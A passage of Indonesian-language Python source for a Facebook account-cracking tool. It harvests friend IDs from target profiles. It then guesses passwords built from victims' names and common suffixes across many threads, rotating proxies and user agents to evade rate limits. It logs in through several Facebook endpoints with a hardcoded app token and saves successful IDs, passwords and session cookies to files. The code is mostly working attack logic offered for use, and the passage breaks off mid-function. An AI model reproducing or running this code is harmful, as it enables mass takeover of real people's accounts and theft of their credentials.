        my_id=[]
    try:
        link = ses.get(
            f"https://graph.facebook.com/me?fields=id,name,friends&access_token={token}",
            cookies={"cookie": cookie},
        ).json()
        for c in link["friends"]["data"]:
            temanku.append(c["id"] + "|" + c["name"])
    except:
        pass
    os.system("clear")
    banner()
    try:
        key = open(".license","r").read()
    except:
        key = "-"
    negara = requests.get("http://ip-api.com/json/").json()["country"]
    ip = requests.get("http://ip-api.com/json/").json()["query"]
    text = Align.center(f"{H2}{negara}{K2}")
    console.print(Panel(text, padding=(0, 12), width=60, style=color_panel))
    dia.append(Panel(f"{P2}Android : {H2}versi {android_version}\n{P2}tanggal : {H2}{hari_ini}\n{P2}jam     : {H2}{jam_fan}\n{P2}simcard : {H2}{simcard[:18]}",width=30,title=f"{P2}Perangkat",style=f"{color_panel}"))
    # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
    dia.append(
        panel(
            f"{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
            title=f"{P2}Bio Data",
            width=30,
            style=f"{color_panel}",
        )
    )
    console.print(Columns(dia))
    prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
[{color_text}02{P2}]. crack dari id Masal
[{color_text}03{P2}]. Lihat Hasil Crack
[{color_text}04{P2}]. Logout [[bold red]hapus cookie[bold white]]
[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
    HaHi = console.input(f" {H2}• {P2}pilih menu : ")
    if HaHi in ["1", "01"]:
        console.print(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
        idt = console.input(f" {H2}• {P2}Masukan Id Target : ")
        url = f'https://www.facebook.com/{idt}'
        dump_publik(cookie,url)
    elif HaHi in ["2", "02"]:
        massal()
    elif HaHi in ["3", "03"]:
        result()
    elif HaHi in ["4", "04"]:
        os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
        console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
    elif HaHi in ["5", "05"]:
        exit()
    else:
    	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")



# ----------------[ BAGIAN-DATA-GRAPHQL ]----------------#
def GetData(req):
    av = re.search('"actorID":"(.*?)"',str(req)).group(1)
    __user = av
    __a = str(random.randrange(1,6))
    __hs = re.search('"haste_session":"(.*?)"',str(req)).group(1)
    __ccg = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
    __rev = re.search('"__spin_r":(.*?),',str(req)).group(1)
    __spin_r = __rev
    __spin_b = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
    __spin_t = re.search('"__spin_t":(.*?),',str(req)).group(1)
    __hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
    fb_dtsg = re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}',str(req)).group(1)
    jazoest = re.search('jazoest=(.*?)"',str(req)).group(1)
    lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
    Data = {'av':av,'__user':__user,'__a':__a,'__hs':__hs,'dpr':'1.5','__ccg':__ccg,'__rev':__rev,'__spin_r':__spin_r,'__spin_b':__spin_b,'__spin_t':__spin_t,'__hsi':__hsi,'__comet_req':'15','fb_dtsg':fb_dtsg,'jazoest':jazoest,'lsd':lsd}
    return(Data)
# ----------------[ BAGIAN-DUMP-GRAPHQL ]----------------#
def dump_publik(cookie,url):
    try:
        session = requests.Session()
        # cookie = open("co.txt", "r").read()
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Cache-Control': 'max-age=0', 'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace', 'Sec-Ch-Prefers-Color-Scheme': 'light', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36', 'Viewport-Width': '924'}
        req = session.get(url, headers=header, cookies={'cookie': cookie}, allow_redirects=True).text
        Data = GetData(req)
        flid = re.search('{"tab_key":"friends_all","id":"(.*?)"}',str(req)).group(1)
        Data.update({'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery','server_timestamps': True,'doc_id': '6709724792472394'})
        cursor = None
        loop=0
        # Iterasi pengambilan data selama ada halaman berikutnya
        while True:
            Data.update({'variables': json.dumps({"count": 8,"cursor": cursor,"scale": 1.5,"search": None,"id": flid})})
            head = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Sec-Ch-Prefers-Color-Scheme': 'dark', 'Sec-Ch-Ua': '', 'Sec-Ch-Ua-Full-Version-List': '', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Model': '', 'Sec-Ch-Ua-Platform': '', 'Sec-Ch-Ua-Platform-Version': '', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
            response = session.post('https://www.facebook.com/api/graphql/',data=Data, headers=head, cookies={'cookie': cookie})
            pos = response.json()
            for x in pos['data']['node']['pageItems']['edges']:
                try:
                    profile = x['node']['actions_renderer']['action']['client_handler']['profile_action']['restrictable_profile_owner']
                    friend_id = profile['id']
                    name = profile['name']
                    fm = f'{friend_id}|{name}'
                    if fm not in id:
                        id.append(fm)
                        loop += 1
                        print('\r • sedang proses mengumpulkan id, berhasil mendapatkan {} ID'.format(loop), end=''); sys.stdout.flush()
                except Exception:
                    pass
            if pos['data']['node']['pageItems']['page_info']['has_next_page']:
                cursor = pos['data']['node']['pageItems']['page_info']['end_cursor']
            else:
                break
        # Setelah proses dump selesai
        if loop == 0:
            console.print(f" \r{H2}• {P2}Failed To Dump ID!")
        else:
            print()
            # console.print(f" \r{H2}• {P2}Success Dump {loop} ID")
        # Panggil fungsi setting dengan mengirim list id
        setting()
    except Exception as e:
        console.print(f" {H2}• {P2}Error, Something Went Wrong!\n", str(e))
        exit()
	    

#----------[ CRACK-PUBLIK  ]----------#
def dump_publikk():
    with requests.Session() as ses:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
        prints(
            Panel(
                f"""{P2}masukan id target, pastikan id target bersifat publik""",
                subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",
                width=60,
                style=f"{color_panel}",
            )
        )
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        if a in ["me", "Me", "ME"]:
            try:
                koH = requests.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for pi in koH["friends"]["data"]:
                    try:
                        id.append(pi["id"] + "|" + pi["name"])
                    except:
                        continue
                setting()
            except Exception as d:
                print(d)
        else:
            try:
                b = ses.get(
                    f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                    cookies={"cookie": cok},
                ).json()
                for c in b["friends"]["data"]:
                    id.append(c["id"] + "|" + c["name"])
                setting()
            except Exception as e:
                print(e)
                
# -------------------[ CRACK-Masal ]----------------#
def massal():
    try:
        token = open(".fantoken.txt", "r").read()
        cok = open(".fancookie.txt", "r").read()
    except IOError:
        exit()
    try:
        Console().print(
            Panel(
                "[bold white] Mau Berapa Target Yang Mau Di Crack",
                width=60,
                style=f"{color_panel}",
                title="[bold green] Crack Masal [bold white]",
            )
        )
        jum = int(input(f" • Masukan : "))
    except ValueError:
        Console().print(f" {H2}• {P2} Wrong input ")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        Console().print(
            panel(
                "[bold white] Masukkan Target ke " + str(yz) + "",
                width=60,
                style=f"{color_panel}",
            )
        )
        kl = Console().input(f" {H2}• {P2}Masukan : ")
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get(
                f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            ).json()
            for mi in col["friends"]["data"]:
                try:
                    iso = mi["id"] + "|" + mi["name"]
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Unstable Signal ")
            exit()
    try:
        setting()
    except requests.exceptions.ConnectionError:
        print(f"")
        print(" [+] Unstable Signal ")
        exit()
    except (KeyError, IOError):
        print(f" [+] Pertemanan Tidak Public ")
        time.sleep(3)
        exit()

def result():
    console.print(Panel(f"""{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}""", width=60, title=f"Hasil Crack", style=color_panel))

    fankycek = console.input(f" {H2}• {P2}Masukan : ")

    if fankycek in ["1", "01"]:
        lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
    elif fankycek in ["2", "02"]:
        lihat_hasil("OK", f"{H2}• {P2}Anda Tidak Mempunyai File OK", "bold green")
    else:
        console.print(f" {H2}• {P2}Pilih Yang Bener Bang")
        exit()

def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
    try:
        files = os.listdir(folder)
        if not files:
            console.print(pesan_tidak_ada)
            time.sleep(3)
            exit()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
        time.sleep(3)
        exit()

    file_map = {}
    for idx, file in enumerate(files, start=1):
        try:
            jumlah = len(open(f"{folder}/{file}", "r").readlines())
        except:
            continue
        num = f"{idx:02}"
        file_map[str(idx)] = file
        file_map[num] = file
        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))

    pilih_file(file_map, folder, warna_akun)

def pilih_file(file_map, folder, warna_akun):
    pilihan = console.input(f" {H2}• {P2}Masukan : ").strip()
    
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
        exit()
    
    file_path = f"{folder}/{file_map[pilihan]}"
    
    try:
        with open(file_path, "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan")
        time.sleep(3)
        exit()
    
    for line in lines:
        data = line.split("|")
        
        if len(data) == 3:
            user, password, cookie = data
            console.print(Panel(f" ID : {user} PASSWORD : {password} | COOKIE : {cookie}", width=60, style=warna_akun))
        elif len(data) == 2:
            id, pw = data
            console.print(Panel(f" ID : {id} PASSWORD : {pw}", width=60, style=warna_akun))
        else:
            console.print(f" {H2}• {P2}Format data tidak valid: {line}")
    
    console.input(f" {H2}• {P2}[ {M2}Klik Enter Untuk Keluar {P2}]")
    exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)


def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz

# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        console.print(f" {H2}• [bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n"
        f"{P2}[{color_text}02{P2}] Crack akun New [/]\n"
        f"{P2}[{color_text}03{P2}] Crack akun Random [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        print("[bold red]Error:[/bold red] Pilihan tidak valid, coba lagi.")
        return setting()  # Rekursi untuk mengulang input


    # Input untuk metode login
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
    if fankylog in ["1", "01"]:
    	method.append("fankygraph")
    elif fankylog in ["2", "02"]:
    	method.append("fankygraphv2")
    elif fankylog in ["3", "03"]:
    	method.append("fankywww")
    elif fankylog in ["4", "04"]:
    	method.append("fankybapi")
    else:
    	method.append("fankygraph")  # Default metode
    # Pengaturan User-Agent
    Console().print(Panel(
        f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
        title="[bold green]Setting User-Agent",
        width=60,
        style=f"{color_panel}"
    ))
    uatambah = console.input(f" {H2}• {P2}Masukan : ").strip()
    if uatambah.lower() in ["y", "ya"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ").strip()
        ualu.append(bzer)
    else:
        ualuh.append("tidak")

     # Pilihan kecepatan metode
    #metcepat()
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}",width=60,style=f"{color_panel}"))
    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()  # Default ke metode cepat
        

# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW-FANKY-GANTENG",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["indonesia123","bismillah123","sayangku123"]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "fankygraph" in method:
                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankytouch,idf,pwv)
                elif "fankybapi" in method:
                	pool.submit(fanky_b_api,idf,pwv)
                else:
                	pool.submit(fanky_b_api,idf,pwv)
                
                	
                	
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")


#-------------------[ CRACK-CEPAT ]------------#
def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT-FANKY-GANTENG",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["bismillah123","sayangku123","indonesia123"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "fankygraph" in method:
                	pool.submit(fankygraphv1,idf,pwv,"graph.facebook.com")
                elif "fankywww" in method:
                	pool.submit(fankywww,idf,pwv)
                elif "fankygraphv2" in method:
                	pool.submit(fankytouch,idf,pwv)
                elif "fankybapi" in method:
                	pool.submit(fanky_b_api,idf,pwv)
                else:
                	pool.submit(fanky_b_api,idf,pwv)
 
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai ngap, btw fanky ganteng",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]INFO",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")

#-------------------[ CRACK-MAIN ]------------#
def fankygraphv1(idf, pwv, url):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FANKY GRAPH {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            params = ({ "access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": random.randint(1, 26), "email": idf, "locale": "zh_CN", "password": pw, "sdk": "Android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5" })
            headers = ({ "Host": url, "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
            post = requests.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False,proxies=proxs)

            if "User must verify their account" in post.text:
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break

            elif "session_key" in post.text and "EAA" in post.text:
                ok += 1
                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break

            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
                prog.advance(des)
                time.sleep(10)

            else:
                continue

        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1


#-------------------[ CRACK-MAIN ]------------#
def fankywww(idf, pwv):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} Fanky Touch {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    # ua = "Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36"
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh: 
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get(f'https://touch.alpha.facebook.com/login.php?')
            head = {
                'authority': 'touch.alpha.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '1.600000023841858',
                'origin': 'https://touch.alpha.facebook.com',
                'referer': 'https://touch.alpha.facebook.com/',
                'accept-encoding': 'br, gzip',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'viewport-width': '980'
            }
            data = {
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(requ.text)).group(1),
                'lsd': re.search('name="lsd" value="(.*?)"', str(requ.text)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(requ.text)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(requ.text)).group(1),
                'email': idf,
                'pass': pw,
                'next': ''
            }
